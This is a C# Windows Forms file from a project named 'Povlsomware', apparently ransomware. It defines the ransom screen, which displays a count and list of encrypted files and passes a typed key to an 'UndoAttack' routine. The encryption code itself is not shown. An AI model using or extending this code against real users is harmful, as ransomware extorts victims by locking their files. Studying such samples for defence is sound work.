using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Povlsomware
{
    public partial class PayM3 : Form
    {
        public PayM3()
        {
            InitializeComponent();
            label2.Text = Program.count.ToString() + " files encrypted";
            listBox1.Items.AddRange(Program.myFiles.ToArray());
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string hihi = textBox1.Text;
            if (hihi.Length > 0)
            {
                Program.UndoAttack(hihi);
            }
        }
    }
}
